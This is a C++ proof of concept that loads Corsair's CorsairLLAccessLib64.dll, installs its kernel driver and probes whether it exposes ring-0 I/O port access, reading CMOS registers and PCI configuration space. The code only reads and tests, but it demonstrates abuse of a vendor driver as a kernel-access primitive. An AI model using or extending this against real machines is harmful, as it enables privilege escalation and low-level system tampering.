#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <iostream>

#include "corsair structs.h"

int main() {
    SetConsoleTitleA("Corsair Ring0-I-O-Ports - Legend");

    HMODULE corsair_dll = LoadLibraryA("CorsairLLAccessLib64.dll");
    if (!corsair_dll) {
        printf("Failed To Load CorsairLLAccessLib64.dll : Reason %d\n", GetLastError());
        return 1;
    }

    printf("DLL loaded: 0x%p\nBoom here comes da bread...\n", (void*)corsair_dll);
    Sleep(5000);

    auto get_interfacefn = (void(*)(uintptr_t*))GetProcAddress(corsair_dll, "CrGetLLAccessInterface");
    if (!get_interfacefn) {
        printf("CrGetLLAccessInterface Not Found :(\n");
        FreeLibrary(corsair_dll);
        return 1;
    }
    printf("CrGetLLAccessInterface Function 0x%p\n", (void*)get_interfacefn);

    Corsair::CorsairLLInterface iface = { 0 };
    get_interfacefn((uintptr_t*)&iface);

    printf("Corsair Interface 0x%p\n", iface);

    DWORD result;

    printf("Creating Driver Service\n");
    result = iface.InstallDriver();
    Sleep(2500);

    printf("Opening device\n");
    result = iface.OpenDevice();
    Sleep(2500);

    if (result == 0) {
        printf("[/] Handle To Driver Created :)\nTesting Driver Capabilities\n");

        DWORD version[2] = { 0 };
        if (iface.GetVersion(version))
            printf("Version: 0x%08X, Data: 0x%08X\n", version[0], version[1]);

        BYTE value = 0;
        if (iface.ReadPortByte(0x80, &value))
            printf("Can perform I/O port operations (Ring 0 access)\n");
        else
            printf("Cannot perform I/O port operations\n");


        iface.WritePortByte(0x70, 0x00);
        BYTE seconds = 0;
        if (iface.ReadPortByte(0x71, &seconds)) {
            printf("[/] Can access CMOS registers (Full I/O privilege)\n");
        }
        else
            printf("[/] Cannot access CMOS registers :(\n");


        DWORD pciAddr = 0x80000000;
        if (iface.WritePortDword(0xCF8, pciAddr)) {
            DWORD vendorDevice = 0;
            if (iface.ReadPortDword(0xCFC, &vendorDevice)) {
                printf("[/] Can access PCI configuration space\n");
                printf("[/] PCI Device at 00:00.0 - Vendor/Device: 0x%08X\n", vendorDevice);
                printf("[/] Vendor ID: 0x%04X, Device ID: 0x%04X\n", vendorDevice & 0xFFFF, (vendorDevice >> 16) & 0xFFFF);
            }
        }
        else {
            printf("[/] Cannot access PCI configuration space :(\n");
        }

    }

    iface.CloseDevice();
    FreeLibrary(corsair_dll);
    printf("Press Enter To Continue\n");
    getchar();
    return 0;
}
